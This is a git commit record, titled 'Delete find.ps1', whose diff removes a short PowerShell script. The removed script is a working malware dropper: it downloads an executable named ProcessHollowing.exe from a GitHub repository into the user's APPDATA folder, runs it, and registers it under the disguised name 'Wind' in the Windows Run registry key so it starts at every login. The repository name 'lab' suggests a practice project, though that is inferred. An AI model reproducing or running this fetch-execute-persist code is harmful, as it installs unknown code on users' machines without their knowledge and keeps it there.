1cf77d56341198ef972dbbd45b2d6c206af36f34
bibi341min <giangmy2001@gmail.com>
2025-07-29 04:51:22 +0700

    Delete find.ps1

--- find.ps1
+++
@@ -1,7 +0,0 @@
-$URL = "https://github.com/bibi341min/lab/blob/main/ProcessHollowing.exe";
-$Path = $env:APPDATA + "\ProcessHollowing.exe" ; 
-Invoke-WebRequest -URI $URL -OutFile $Path; 
-Start-Process -FilePath $Path; $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; 
-$regName = "Wind"; 
-$regValue = $Path; 
-Set-ItemProperty -Path $regPath -Name $regName -Value $regValue;
